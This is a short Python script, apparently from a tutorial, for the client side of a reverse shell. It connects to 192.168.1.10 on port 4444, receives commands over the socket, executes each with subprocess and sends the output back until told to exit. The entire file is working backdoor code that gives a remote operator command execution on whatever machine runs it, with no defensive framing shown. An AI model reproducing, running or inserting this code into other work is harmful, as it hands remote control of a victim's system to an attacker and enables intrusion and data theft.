#!/usr/bin/env python3

# Client Side

import socket
import subprocess

SERVER_HOST = "192.168.1.10"
SERVER_PORT = 4444
BUFFER_SIZE = 1024

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()



